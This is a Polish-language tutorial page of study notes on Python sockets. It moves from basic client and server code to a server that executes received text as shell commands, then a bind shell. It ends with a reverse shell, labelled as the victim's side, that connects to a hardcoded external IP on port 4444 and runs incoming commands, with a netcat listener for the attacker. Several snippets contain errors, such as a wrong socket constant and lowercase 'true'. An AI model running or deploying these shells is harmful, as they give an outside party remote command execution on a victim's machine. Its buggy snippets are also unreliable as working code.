---
layout:
  title:
    visible: false
  description:
    visible: false
  tableOfContents:
    visible: false
  outline:
    visible: false
  pagination:
    visible: false
---

# sockets

**CLIENT SIDE**MY SIĘ ŁĄCZYMY Z SERWEREM

<div data-full-width="true">

<figure><img src=".gitbook/assets/1 (12).jpg" alt=""><figcaption></figcaption></figure>

</div>

```python
import socket

ip="127.0.0.1"
port = 1337

sock=socket.socket(socket.AF_INET, socket.SOCK.STREAM)
result=sock.connect_ex(ip,port)
print(result)
sock.close()

--------------------------console output
0
```

<figure><img src=".gitbook/assets/1 (13).jpg" alt=""><figcaption></figcaption></figure>

```python
#musi być b czyli wersja bajtowa bo inaczej protokół nie zrozumie
sock.send(b"Hello")
```

<div data-full-width="true">

<figure><img src=".gitbook/assets/1 (14).jpg" alt=""><figcaption></figcaption></figure>

</div>

<div data-full-width="true">

<figure><img src=".gitbook/assets/2 (8).jpg" alt=""><figcaption></figcaption></figure>

</div>

**SERVER SIDE**JESTEŚMY SERWEREM

<div data-full-width="true">

<figure><img src=".gitbook/assets/1 (15).jpg" alt=""><figcaption></figcaption></figure>

</div>

**tworzymy listenera**taki pythonowy netcat nc -nlvp 1337

```python
import socket

sock=socket.socket()
sock.bind(("0.0.0.0",1337))
sock.listen(1)
conn,addr=sock.accept()
info=conn.recv(1024).decode()
print(info)
sock.close()
```

<div data-full-width="true">

<figure><img src=".gitbook/assets/1 (16).jpg" alt=""><figcaption></figcaption></figure>

</div>

**Create basic connectivitv between the client and server sockets**

_CLIENT_

```python
import socket

ip="127.0.0.1"
port = 1337

sock=socket.socket()
result=sock.connect_ex((ip,port))
while true:
  sock.send(input(">>>").encode())
  print(f"{port} : {result}")
sock.close()
```

_SERVER_

```python
import socket

sock=socket.socket()
sock.bind(("0.0.0.0",1337))
sock.listen(1)
conn,addr=sock.accept()
parsed=""

while true:
  info=conn.recv(8)
  parsed+=info.decode()
  print(parsed)
  if len(info)<8:
    print(parsed)
  if info=="exit":
    break
sock.close()
```

**SERVER - CLIENT**

<div data-full-width="true">

<figure><img src=".gitbook/assets/1 (17).jpg" alt=""><figcaption></figcaption></figure>

</div>

**CLIENT**

```python
import socket

ip="127.0.0.1"
port = 1337

sock=socket.socket()
result=sock.connect_ex((ip,port))
while true:
  sock.send(input(">>>").encode())
  print(f"{port} : {result}")
sock.close()
```

**SERVER**BĘDZIE ODCZYTYWAŁ TO CO WPISZE KLIENT JAKO KOMENDĘ W CMD np dir, ls, nmap

```python
import socket
import os

sock=socket.socket()
sock.bind(("0.0.0.0",1337))
sock.listen(1)
conn,addr=sock.accept()
parsed=""

while true:
  info=conn.recv(8)
  parsed+=info.decode()
  print(parsed)
  if len(info)<8:
    print(os.system(parsed))
  if info=="exit":
    break
sock.close()
```

<div data-full-width="true">

<figure><img src=".gitbook/assets/1 (18).jpg" alt=""><figcaption></figcaption></figure>

</div>

<div data-full-width="true">

<figure><img src=".gitbook/assets/2 (9).jpg" alt=""><figcaption></figcaption></figure>

</div>

_BIND-SHELL_

**CLIENT**

```python
import socket

ip="127.0.0.1"
port = 1337

sock=socket.socket()
result=sock.connect_ex((ip,port))
while true:
  sock.send(input(">>>").encode())
  print(sock.recv(2048).decode())
  print(sock.recv(2048).decode())
sock.close()
```

**SERVER**

```python
import socket
import os
import subprocess

sock=socket.socket()
sock.bind(("0.0.0.0",1337))
sock.listen(1)
conn,addr=sock.accept()
parsed=""

while true:
  info=conn.recv(2048).decode()
  conn.send(info.encode())
  var=str(os.system(info)).encode()
  proc=os.popen(info).read()
  print(proc)
  conn.send(proc.encode())
  if info=="exit":
    break
sock.close()
```

_REVERSE SHELL_

<div data-full-width="true">

<figure><img src=".gitbook/assets/1 (19).jpg" alt=""><figcaption></figcaption></figure>

</div>

<div data-full-width="true">

<figure><img src=".gitbook/assets/2 (10).jpg" alt=""><figcaption></figcaption></figure>

</div>

**CLIENT** OFIARA

```python
import socket
import os

sock=socket.socket()
res=sock.connect(("146.59.35.163",4444))

while true:
  info=sock.recv(2048).decode()
  var=os.popen(info).read()
  sock.send(var.encode())
sock.close()
```

**SERVER** ATAKUJĄCY

```python
#w terminalu wpisujemy
nc -nlvp 4444
```
